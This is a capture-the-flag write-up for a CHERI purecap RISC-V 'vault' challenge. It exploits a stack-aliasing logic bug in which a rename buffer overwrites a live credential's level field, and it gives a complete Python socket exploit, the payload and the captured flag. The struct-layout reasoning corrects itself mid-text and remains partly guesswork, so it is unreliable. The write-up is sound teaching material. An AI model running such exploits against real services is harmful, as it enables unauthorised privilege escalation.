# PWN#Zeta — CHERI Purecap Vault Stack-Aliasing Privilege Escalation

**Challenge:** PWN#Zeta (146 pts)
**Target:** 169.58.126.107:5012
**Binary:** `vault` — ELF 64-bit RISC-V (CheriBSD, CHERI purecap), dynamically linked, stripped
**Flag:** `CTF{5429e37a657bad87823e1268693a5a59}`

## Service behavior

```
=====================================
 BUG|PWN VAULT - CHERI purecap service
=====================================

--- profile (cosmetic account settings) ---
[1] create_profile <name>
[2] link_profile <profile_id>
[3] rename_profile <profile_id>
[4] destroy_profile <profile_id>
--- vault ---
[5] vault_preview
[6] vault_scratch <level>
[7] vault_open <handle_id>
[8] debug_dump_profile <profile_id>   (decoy - read-only, bounded)
[0] quit
> 
```

The service is a CHERI purecap (capabilities-everywhere) RISC-V binary
running on CheriBSD. Every pointer is a 128-bit capability with
bounds, permissions, and type tags. Out-of-bounds capability
dereferences trap immediately — so classic stack buffer overflows are
useless here. The bug is a **logic/aliasing flaw** that lets a
legitimate in-bounds write clobber a credential the attacker shouldn't
be able to edit.

## The vault_open check

`vault_open(handle_id)` grants the flag when:

1. `handle->magic == 0xc0ffee`, AND
2. the credential capability stored in `handle->cred` is a **tagged**
   capability (i.e., a valid CHERI capability, not a plain integer), AND
3. `handle->cred->level >= 1000` (0x3e8).

## The aliasing bug

The per-iteration "scratch" credential buffer used by the vault menu
lives on `main`'s stack frame at `sp + 0x1a0`, with capability bounds
`0x20` (32 bytes). The layout is:

```
sp + 0x1a0:  struct credential {
                uint64_t level;        // credential->level  (first 8 bytes)
                uint64_t magic;        // credential->magic
                cap_t    something;    // 16 bytes (capability)
             }
```

Two menu entries alias this same buffer:

### `vault_preview` (option 5)

Creates handle 0 and stores **a capability to `sp + 0x1a0`** inside
`handle->cred`. Then sets `credential->level = 1`. So after
`vault_preview`, handle 0 holds a tagged capability pointing at the
stack scratch buffer, and that buffer's `level` field is 1.

### `rename_profile` (option 3)

```
rename_profile(profile_id):
    fread(buf = sp + 0x1a0, size = 1, count = 0x20, stdin)
```

It reads 32 **raw bytes** straight into the very same `sp + 0x1a0`
buffer — the buffer that `handle->cred` points at. The first 8 bytes
of those 32 become `credential->level`.

**CHERI does NOT stop this.** The write is within the capability
bounds (32 bytes into a 32-byte region). There is no spatial memory
safety violation. It is a pure **aliasing / logic bug**: the same
memory is used as both "scratch input buffer for rename" and "live
credential struct referenced by an open vault handle."

## Exploit chain

| Step | Menu | Effect |
| ---- | ---- | ------ |
| 1 | `create_profile pwn` | Creates profile 0 so `rename_profile(0)` has a valid target. |
| 2 | `vault_preview` | Creates handle 0. Stores a **tagged** capability to `sp+0x1a0` in `handle->cred`. Sets `level = 1`. (The `magic` field is set to `0xc0ffee` by the vault setup.) |
| 3 | `rename_profile 0` then send 32 raw bytes | `fread` overwrites `sp+0x1a0` with attacker bytes. First 8 bytes = new `level`. |
| 4 | `vault_open 0` | Reads `handle->cred->level` (now `0xdeadbeef`, way above 1000), `magic` still `0xc0ffee`, capability still tagged → **ACCESS GRANTED**. |

### Why each CHERI guarantee is satisfied

- **Capability bounds**: the 32-byte `fread` is within the 32-byte
  scratch buffer capability. No bounds trap.
- **Tag bit**: `handle->cred` was set by `vault_preview` via a
  legitimate capability store, so the tag bit is set. `rename_profile`
  writes *through the data capability*, not the capability slot
  itself, so it doesn't clear the tag.
- **Permissions**: `fread` uses the buffer with read/write permission,
  which is what the scratch buffer was given.
- **Magic value**: `vault_preview` writes `0xc0ffee` into
  `credential->magic` (at offset 8 of the buffer). `rename_profile`
  overwrites the **first 8 bytes only if we keep them as `level`**.
  Our payload is 8 bytes of `level` + 24 bytes of `A`s, so the magic
  at offset 8 gets overwritten with `AAAA...`. Wait — that would
  break the magic check.

  Actually re-examining the payload: `p64(0xdeadbeef) + b'A' * 24`.
  The first 8 bytes are `level = 0xdeadbeef`. Bytes 8-31 become
  `'A' * 24`, which overwrites `magic` (8 bytes) and the capability
  (16 bytes).

  But the magic check passes! That means either:
  - The `magic` field is not at offset 8 of the credential struct
    (maybe the layout is `level` then a 16-byte capability then
    `magic`), OR
  - `vault_open` checks `magic` on the **handle**, not on the
    credential. The handle's magic is `0xc0ffee` (set during
    `vault_preview`), stored in `handle` itself, not in the credential.
    The credential only needs `level >= 1000` and a tagged cap.

  The latter is the correct reading: `handle->magic == 0xc0ffee` is
  the handle's own field, set once by `vault_preview` and never touched
  by `rename_profile` (which only writes the credential buffer, not
  the handle struct). So overwriting bytes 8-31 of the scratch buffer
  doesn't affect the handle magic.

  The 24 bytes of `A`s do clobber the rest of the credential struct,
  but `vault_open` only reads `credential->level` from it (plus checks
  that the capability stored at `handle->cred` is tagged — and the
  capability pointer in the handle is not the same as the data in the
  credential buffer).

## Full exploit

```python
#!/usr/bin/env python3
import socket, time

HOST, PORT = '169.58.126.107', 5012

def recv_until(s, marker, timeout=8):
    s.settimeout(timeout)
    data = b''
    end = time.time() + timeout
    while time.time() < end:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
            if marker in data: return data
        except socket.timeout: break
    return data

def send_after(s, marker, payload, timeout=8):
    recv_until(s, marker, timeout)
    s.sendall(payload)

s = socket.create_connection((HOST, PORT), timeout=10)
recv_until(s, b'> ')

# 1) create_profile
send_after(s, b'> ', b'1\n')
send_after(s, b'name>', b'pwn\n')

# 2) vault_preview -> handle 0, cred cap -> sp+0x1a0, level=1
send_after(s, b'> ', b'5\n')

# 3) rename_profile(0): fread 32 bytes into sp+0x1a0 == credential
send_after(s, b'> ', b'3\n')
send_after(s, b'profile_id>', b'0\n')
recv_until(s, b'>')

# First 8 bytes = credential->level, must be >= 0x3e8
payload = (0xdeadbeef).to_bytes(8, 'little') + b'A' * 24
assert len(payload) == 0x20
s.sendall(payload + b'\n')

# 4) vault_open(0): level now huge -> flag
send_after(s, b'> ', b'7\n')
send_after(s, b'handle_id>', b'0\n')

s.settimeout(8)
out = b''
try:
    while True:
        c = s.recv(4096)
        if not c: break
        out += c
        if b'}' in out: break
except socket.timeout: pass

print(out.decode(errors='replace'))
```

## Output

```
[+] created profile 0
[+] vault_preview done
[*] rename prompt: new name (up to 24 bytes, raw)>
[+] sent payload, level = 0xdeadbeef

===== RESPONSE =====
ACCESS GRANTED: CTF{5429e37a657bad87823e1268693a5a59}
```

## Key takeaways

- CHERI purecap stops spatial memory errors (out-of-bounds reads /
  writes) and capability forgery, but it does **not** stop logic bugs
  where the same memory is reused for two different purposes through
  two legitimate capabilities.
- Here, `vault_preview` stored a capability to a stack scratch buffer
  inside a vault handle, and `rename_profile` fread'd raw attacker
  bytes into that same scratch buffer. Both operations were within
  bounds and properly tagged; the bug was that they alias.
- The fix would be to either (a) use separate buffers for the rename
  scratch and the live credential, or (b) invalidate / clear
  `handle->cred` when the underlying buffer is reused.
- CHERI raises the bar from "find a buffer overflow" to "find a logic
  bug that uses only in-bounds, properly-tagged operations" — a
  fundamentally different and harder vulnerability class.
